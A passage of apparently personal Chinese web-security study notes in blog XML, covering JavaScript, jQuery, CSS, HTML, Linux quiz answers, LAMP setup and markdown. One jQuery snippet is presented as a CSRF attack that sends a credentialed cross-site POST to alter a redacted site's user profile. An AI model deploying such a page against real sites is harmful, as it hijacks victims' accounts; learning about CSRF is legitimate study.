class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>弹窗</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#警告框</span><br><span class="line"><span class="built_in">window</span>.alert(<span class="string">"sometext"</span>)</span><br><span class="line">#确认框</span><br><span class="line"><span class="built_in">window</span>.confirm(<span class="string">"sometext"</span>)</span><br><span class="line">#提示框</span><br><span class="line"><span class="built_in">window</span>.prompt(<span class="string">"sometext"</span>, <span class="string">"defaultvalue"</span>)</span><br></pre></td></tr></table></figure></li><li><p>计时</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#间隔指定的毫秒数不停的执行指定代码</span><br><span class="line"><span class="built_in">window</span>.setInterval(<span class="string">"javascript function"</span>, milliseconds)</span><br><span class="line">#停止setInterval()方法执行的函数代码</span><br><span class="line"><span class="built_in">window</span>.clearInterval(intervalVariable)</span><br><span class="line">#第二个参数指示从当前起多少毫秒后执行第一个参数</span><br><span class="line"><span class="built_in">window</span>.setTimeout(<span class="string">"js function"</span>, milliseconds)</span><br><span class="line">#用于停止执行setTimeout()方法的函数代码</span><br><span class="line"><span class="built_in">window</span>.clearTimeout(timeoutVariable)</span><br></pre></td></tr></table></figure></li><li><p>Cookie</p><p>cookie是一些数据，存储于电脑上的文本文件中。当web服务器向浏览器发送web页面时，在连接关闭后，服务端不会记录用户信息。</p><p>cookie的作用就是用于解决“如何记录客户端的用户信息”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 当用户访问web页面时，他的名字可以记录在cookie中</span><br><span class="line">* 在用户下一次访问该页面时，可以在cookie中读取用户访问记录</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#创建cookie</span><br><span class="line"><span class="built_in">document</span>.cookie=<span class="string">"username=John Doe; expires=Thu, 18 Dec 2043 12:00:00 GMT; path=/"</span>;</span><br><span class="line">#读取cookie</span><br><span class="line"><span class="keyword">var</span> x = <span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-JQuery"><a href="#2-JQuery" class="headerlink" title="2. JQuery"></a>2. JQuery</h3><p>​    内容比较细碎，多看看<a href="https://www.runoob.com/jquery/jquery-tutorial.html" target="_blank" rel="noopener">jQuery教程</a></p><p>​    使用jQuery对***账户进行CSRF攻击，代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>hack***<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://libs.baidu.com/jquery/2.0.0/jquery.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="javascript">    $.ajax(&#123;</span></span><br><span class="line"><span class="javascript">        type:<span class="string">'POST'</span>,</span></span><br><span class="line"><span class="javascript">        url:<span class="string">"http://www.***.com/api/user/info"</span>,</span></span><br><span class="line"><span class="javascript">        dataType:<span class="string">'json'</span>,</span></span><br><span class="line">        data: &#123;</span><br><span class="line"><span class="javascript">            allow_status:<span class="string">"1"</span>,</span></span><br><span class="line"><span class="javascript">            heading:<span class="string">""</span>,</span></span><br><span class="line"><span class="javascript">            id_number:<span class="string">"123456789123456789"</span>,</span></span><br><span class="line"><span class="javascript">            nickname:<span class="string">"wangyingminghanpi"</span>,</span></span><br><span class="line"><span class="javascript">            real_name:<span class="string">"本币"</span>,</span></span><br><span class="line"><span class="javascript">            user_tag:<span class="string">'[]'</span>,</span></span><br><span class="line">        &#125;,</span><br><span class="line">        xhrFields:&#123;</span><br><span class="line"><span class="javascript">            withCredentials:<span class="literal">true</span>  <span class="comment">//支持附带详细信息,可以携带cookie</span></span></span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        crossDomain: <span class="literal">true</span>,<span class="comment">//请求偏向外域,支持跨域请求</span></span></span><br><span class="line"><span class="javascript">        success: <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">          <span class="built_in">console</span>.log(data);</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DOM </tag>
            
            <tag> BOM </tag>
            
            <tag> jQuery </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>note13</title>
      <link href="/2019/08/01/note13/"/>
      <url>/2019/08/01/note13/</url>
      
        <content type="html"><![CDATA[<p><strong>Abstract</strong>: 初探CSS+JS</p><a id="more"></a><!--export--><h3 id="1-CSS"><a href="#1-CSS" class="headerlink" title="1. CSS"></a>1. CSS</h3><p>全程是Cascading Style Sheets</p><p>引入方式：</p><ul><li><p>行内样式</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"display:none"</span>&gt;</span>我是段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>优先级最高</p></li><li><p>内嵌式</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span></span><br><span class="line">        body&#123;</span><br><span class="line">            background-color: red</span><br><span class="line">        &#125;</span><br><span class="line">        p&#123;</span><br><span class="line">            margin-left: 20px</span><br><span class="line">        &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>外链式</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"css/login.css"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>优先级：行内＞内嵌＞外链</p><p>更多内容请访问<a href="https://www.w3school.com.cn/css/index.asp" target="_blank" rel="noopener">w3cschool</a></p></li></ul><h3 id="2-JS"><a href="#2-JS" class="headerlink" title="2. JS"></a>2. JS</h3><p><code>getElementById</code>用法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#“查找”id="demo"的HTML元素，并修改元素内容</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">'demo'</span>).innerHTML = <span class="string">"hello world"</span>;</span><br><span class="line">#改变HTML元素的样式，是改变HTML属性的一种变种</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"demo"</span>).style.fontSize=<span class="string">"25px"</span>;</span><br><span class="line">#通过改变display样式来隐藏HTML元素</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"demo"</span>).style.display=<span class="string">"none"</span>;</span><br><span class="line">#通过改变display样式来显示隐藏HTML元素</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"demo"</span>).style.display=<span class="string">"block"</span>;</span><br></pre></td></tr></table></figure><p>​    JS显示方案</p><p>​    使用<code>window.alert()</code>写入警告框</p><p>​    使用<code>document.write()</code>写入HTML输出</p><p>​    使用<code>innerHTML</code>写入HTML元素</p><p>​    使用<code>console.log()</code>写入浏览器控制台</p><h4 id="JS-HTML-DOM文档"><a href="#JS-HTML-DOM文档" class="headerlink" title="JS HTML DOM文档"></a>JS HTML DOM文档</h4><ul><li>查找HTML元素 </li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#通过元素id查找元素</span><br><span class="line"><span class="built_in">document</span>.getElementById(id)</span><br><span class="line">#通过标签名来查找元素</span><br><span class="line"><span class="built_in">document</span>.getElementByTagName(name)</span><br><span class="line">#通过类名来查找元素</span><br><span class="line"><span class="built_in">document</span>.getElementByClassName(name)</span><br></pre></td></tr></table></figure><ul><li>改变HTML元素 </li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#改变元素的inner HTML</span><br><span class="line">element.innerHTML= <span class="keyword">new</span> html content</span><br><span class="line">#改变HTML元素的属性值</span><br><span class="line">element.attribute = <span class="keyword">new</span> value</span><br><span class="line">#改变HTML元素的样式</span><br><span class="line">element.style.property = <span class="keyword">new</span> style</span><br></pre></td></tr></table></figure><ul><li>添加和删除元素 </li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#创建HTML元素</span><br><span class="line"><span class="built_in">document</span>.createElement(element)</span><br><span class="line">#创建HTML元素</span><br><span class="line"><span class="built_in">document</span>.removeChild(element)</span><br><span class="line">#添加HTML元素</span><br><span class="line"><span class="built_in">document</span>.appendChild(element)</span><br><span class="line">#替换HTML元素</span><br><span class="line"><span class="built_in">document</span>.replaceChile(element)</span><br><span class="line">#写入HTML输出流</span><br><span class="line"><span class="built_in">document</span>.write(text)</span><br></pre></td></tr></table></figure><ul><li>添加事件处理程序 </li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#向onclick事件添加事件处理程序</span><br><span class="line"><span class="built_in">document</span>.getElementById(id).onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;code&#125;</span><br></pre></td></tr></table></figure><p>源码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>JS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"div1"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"p1"</span>&gt;</span>这是一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"p2"</span>&gt;</span>这是第二段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="xml">            //新建<span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span>标签</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> para = <span class="built_in">document</span>.createElement(<span class="string">"p"</span>);</span></span><br><span class="line"><span class="javascript">            <span class="comment">//新建文档</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> node = <span class="built_in">document</span>.createTextNode(<span class="string">"这是用js加的新段落。"</span>);</span></span><br><span class="line"><span class="xml">            //将node添加到para中 → <span class="tag">&lt;<span class="name">p</span>&gt;</span>文档<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line">            para.appendChild(node);</span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> element = <span class="built_in">document</span>.getElementById(<span class="string">"div1"</span>);</span></span><br><span class="line"><span class="javascript">            <span class="comment">//将p加入到div中</span></span></span><br><span class="line">            element.appendChild(para);</span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>note12</title>
      <link href="/2019/07/30/note12/"/>
      <url>/2019/07/30/note12/</url>
      
        <content type="html"><![CDATA[<p><strong>Abstract</strong>: 初学HTML</p><a id="more"></a><!--export--><h3 id="1-些简单的标签"><a href="#1-些简单的标签" class="headerlink" title="1. 些简单的标签"></a>1. 些简单的标签</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span>   //<span class="tag">&lt;<span class="name">html</span>&gt;</span>与<span class="tag">&lt;/<span class="name">html</span>&gt;</span>之间的文本描述网页</span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>网页标题<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span>       //<span class="tag">&lt;<span class="name">body</span>&gt;</span>与<span class="tag">&lt;/<span class="name">body</span>&gt;</span>之间的文本是可见的页面内容</span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">        这是一个标题//一级标题</span><br><span class="line">        <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">        这是一个段落//段落部分</span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-html中的标签："><a href="#2-html中的标签：" class="headerlink" title="2. html中的标签："></a>2. html中的标签：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">* HTML标题是通过`&lt;h1&gt;-&lt;h6&gt;`等标签进行定义的</span><br><span class="line">* HTML段落是通过`&lt;p&gt;`标签进行定义的</span><br><span class="line">* HTML链接是通过`&lt;a&gt;`标签进行定义的</span><br><span class="line">* HTML图像是通过`&lt;img&gt;`标签进行定义的</span><br><span class="line">* HTML表格是通过`table/thead/tbody/th/td`等标签来定义的</span><br></pre></td></tr></table></figure><h3 id="3-HTML-form表单"><a href="#3-HTML-form表单" class="headerlink" title="3. HTML form表单"></a>3. HTML form表单</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"www.baidu.com"</span> <span class="attr">method</span>=<span class="string">"get"</span> <span class="attr">enctype</span>=<span class="string">"application/x-form-urlenconded"</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* Action 属性表明表单将要提交到哪里</span><br><span class="line">* Method 表示提交用的方法分别为`get`和`post`可选</span><br><span class="line">* Enctype 规定在发送表单数据前对数据进行编码的格式</span><br></pre></td></tr></table></figure><h3 id="4-输入框-lt-input-gt-标签最常用"><a href="#4-输入框-lt-input-gt-标签最常用" class="headerlink" title="4. 输入框&lt;input&gt;标签最常用"></a>4. 输入框<code>&lt;input&gt;</code>标签最常用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">* `type=&quot;text&quot;` 普通的文本输入框</span><br><span class="line">* `type=&quot;password&quot;`带星号的密码输入框</span><br><span class="line">* `type=&quot;radio&quot;`单选框，同一类型要有统一的`name`属性，表明是一类</span><br><span class="line">* `type=&quot;checkbox&quot;`复选框，添加`checked`属性会默认选中</span><br><span class="line">* `type=&quot;file&quot;` 文件上传选择</span><br><span class="line">* `type=&quot;email&quot;`带简单验证的邮箱输入</span><br><span class="line">* `&lt;textarea&gt;`标签input只能单行输入，`textarea`可以多行输入</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>stage1知识盲点</title>
      <link href="/2019/07/30/stage1-exam/"/>
      <url>/2019/07/30/stage1-exam/</url>
      
        <content type="html"><![CDATA[<p><strong>Abstract</strong>: 知识盲点总结</p><a id="more"></a><!--export--><p>运行一个脚本，用户不需要什么样的权限？</p><ul><li><input disabled type="checkbox"> read </li><li><input checked disabled type="checkbox"> write</li><li><input disabled type="checkbox"> execute</li><li><input disabled type="checkbox"> browse on the directory</li></ul><p>在bash中，在一条命令后加入<code>1&gt;&amp;2</code>意味着：</p><ul><li><input disabled type="checkbox"> 标准错误输出重定向到标准输入</li><li><input disabled type="checkbox"> 标准输入重定向到标准错误输出</li><li><input checked disabled type="checkbox"> 标准输出重定向到标准错误输出</li><li><input disabled type="checkbox"> 标准输出重定向到标准输入</li></ul><p><code>1表示标准输出，2表示标准错误，&amp;表示等同于的意思</code></p><p>下面哪条命令可以把f1.txt复制为f2.txt：</p><ul><li><input disabled type="checkbox"> cp f1.txt |f2.txt</li><li><input disabled type="checkbox"> cat f1.txt | f2.txt</li><li><input checked disabled type="checkbox"> cat f1.txt &gt; f2.txt</li><li><input disabled type="checkbox"> copy f1.txt | f2.txt</li></ul><p>如何显示Linux系统中注册的用户数（包含系统用户）？</p><ul><li><input disabled type="checkbox"> account-l</li><li><input disabled type="checkbox"> nl /etc/passwd |head</li><li><input disabled type="checkbox"> wc –user /etc/passwd</li><li><input checked disabled type="checkbox"> wc –lines /etc/passwd</li></ul><p><code>word count，--line/-l只显示行数</code></p><p>命令kill 9的含义是：</p><ul><li><input disabled type="checkbox"> kills the process whose PID is 9</li><li><input disabled type="checkbox"> kills all processes belonging to UID 9</li><li><input disabled type="checkbox"> sends SIGKILL to the process whose PID is 9</li><li><input checked disabled type="checkbox"> sends SIGTERM to the process whose PID is 9</li></ul><p>在vi中退出不保存的命令是：</p><ul><li><input disabled type="checkbox"> :q</li><li><input disabled type="checkbox"> :w</li><li><input disabled type="checkbox"> :wq</li><li><input checked disabled type="checkbox"> :q!</li></ul><p>下面哪个协议使用了两个以上的端口：</p><ul><li><input disabled type="checkbox"> telnet</li><li><input checked disabled type="checkbox"> FTP</li><li><input disabled type="checkbox"> rsh</li><li><input disabled type="checkbox"> HTTP</li></ul><p>什么命令用来只更行已经安装过的rpm软件包：</p><ul><li><input checked disabled type="checkbox"> rpm -U *.rpm</li><li><input disabled type="checkbox"> rpm -F *.rpm</li><li><input disabled type="checkbox"> rpm -e *.rpm</li><li><input disabled type="checkbox"> rpm -q *.rpm</li></ul><p>ping使用的协议是：</p><ul><li><input disabled type="checkbox"> TCP</li><li><input disabled type="checkbox"> UDP</li><li><input disabled type="checkbox"> SMB</li><li><input checked disabled type="checkbox"> ICMP</li></ul><p>Linux系统中添加一个用户，改变账号过期时间，用哪个命令：</p><ul><li><input disabled type="checkbox"> usermod -a</li><li><input disabled type="checkbox"> usermod -d</li><li><input disabled type="checkbox"> usermod -x</li><li><input checked disabled type="checkbox"> usermod -e</li></ul><p>静态IP和动态IP的区别，具体应用场景</p><p>静态IP：IP地址是手动分配的，通常需要付费</p><p>动态IP：动态IP是自动分配的</p><table><thead><tr><th align="center">名称</th><th align="center">优点</th><th align="center">缺点</th></tr></thead><tbody><tr><td align="center">静态IP</td><td align="center">地址不变—适用于web服务器，电子邮件服务器和其他internet服务器</td><td align="center">比动态IP贵</td></tr><tr><td align="center"></td><td align="center">静态IP对于VoIP和游戏应用程序更可靠</td><td align="center">需要额外的安全性</td></tr><tr><td align="center">动态IP</td><td align="center">比静态IP地址便宜</td><td align="center">需要DHCP服务器才能获取IP地址</td></tr><tr><td align="center"></td><td align="center">更改IP地址可提供更多隐私</td><td align="center">非静态的，每次IP地址更改时，可能需要再次找到你的IP</td></tr></tbody></table><p>搭建LAMP所需要的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#安装apache服务</span></span><br><span class="line">[root]$ yum install httpd</span><br><span class="line"><span class="comment">#设置开机启动</span></span><br><span class="line">[root]$ systemctl <span class="built_in">enable</span> httpd</span><br><span class="line"><span class="comment">#开启服务</span></span><br><span class="line">[root]$ systemctl start httpd</span><br><span class="line"><span class="comment">#设置防火墙</span></span><br><span class="line">[root]$ firewall-cmd --zone=public --add-port=80/tcp --permanent</span><br><span class="line">[root]$ firewall-cmd --zone=public --add-port=433/tcp --permanent</span><br><span class="line"><span class="comment">#重新加载，方可生效</span></span><br><span class="line">[root]$ firewall-cmd --reload</span><br><span class="line"></span><br><span class="line"><span class="comment">#安装mysql服务</span></span><br><span class="line">[root]$ yum install mariadb-server</span><br><span class="line"><span class="comment">#设置开机启动</span></span><br><span class="line">[root]$ systemctl <span class="built_in">enable</span> mariadb</span><br><span class="line"><span class="comment">#启动服务</span></span><br><span class="line">[root]$ systemctl start mariadb</span><br><span class="line"><span class="comment">#初始化mysql</span></span><br><span class="line">[root]$ mysql_secure_installation</span><br><span class="line"></span><br><span class="line"><span class="comment">#安装php</span></span><br><span class="line">[root]$ yum install php php-gd php-mysql php-pdo php-*</span><br><span class="line"><span class="comment">#重启apache</span></span><br><span class="line">[root]$ systemctl restart httpd</span><br><span class="line"><span class="comment">#修改网站根目录的用户和用户组</span></span><br><span class="line">[root]$ chown -R apache:apache /var/www/html</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
          <category> summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux基本命令 - 搭建服务 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>markdown语法</title>
      <link href="/2019/07/29/simpleapp/"/>
      <url>/2019/07/29/simpleapp/</url>
      
        <content type="html"><![CDATA[<p><strong>Abstract</strong>: 用typora写markdown文档的语法</p><a id="more"></a><!--export--><h1 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h1><h3 id="下划线"><a href="#下划线" class="headerlink" title="下划线"></a>下划线</h3><blockquote><p><u>下划线</u></p></blockquote><h3 id="强调"><a href="#强调" class="headerlink" title="强调"></a>强调</h3><p><strong>重要</strong></p><h3 id="斜体"><a href="#斜体" class="headerlink" title="斜体"></a>斜体</h3><p><em>斜体</em></p><h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><p><del>删除</del></p><h3 id="方框"><a href="#方框" class="headerlink" title="方框"></a>方框</h3><p><code>框起来</code></p><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>今天吃啥呀<a href="没吃">^1</a></p><h3 id="高亮"><a href="#高亮" class="headerlink" title="高亮"></a>高亮</h3><p>==高亮==</p><h3 id="角标"><a href="#角标" class="headerlink" title="角标"></a>角标</h3><p>上角标：x^2^</p><p>下角标：H<del>2</del>O</p><p>$x^2+x<del>1</del>$</p><h3 id="转义"><a href="#转义" class="headerlink" title="转义"></a>转义</h3><p>#</p><h1 id="List"><a href="#List" class="headerlink" title="List"></a>List</h1><h3 id="有序"><a href="#有序" class="headerlink" title="有序"></a>有序</h3><ol><li></li><li></li></ol><h3 id="无序"><a href="#无序" class="headerlink" title="无序"></a>无序</h3><ul><li>1</li><li>2<ul><li>1</li><li>2</li></ul></li></ul><h3 id="todo-list"><a href="#todo-list" class="headerlink" title="todo list"></a>todo list</h3><ul><li><input disabled type="checkbox"> 背单词</li><li><input disabled type="checkbox"> 整理笔记</li></ul><h3 id="Table"><a href="#Table" class="headerlink" title="Table"></a>Table</h3><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr></tbody></table><h3 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h3><hr><hr><h3 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h3><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><p><a href="https://www.bilibili.com/video/av18508430/" target="_blank" rel="noopener">Typora</a></p><h3 id="数学公式"><a href="#数学公式" class="headerlink" title="数学公式"></a>数学公式</h3><p>$$<br>&lt;Empty \space Math \space Block&gt;<br>$$</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">abc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure><h3 id="表情"><a href="#表情" class="headerlink" title="表情"></a>表情</h3><p>:sweat:</p><p>:happy:</p><h3 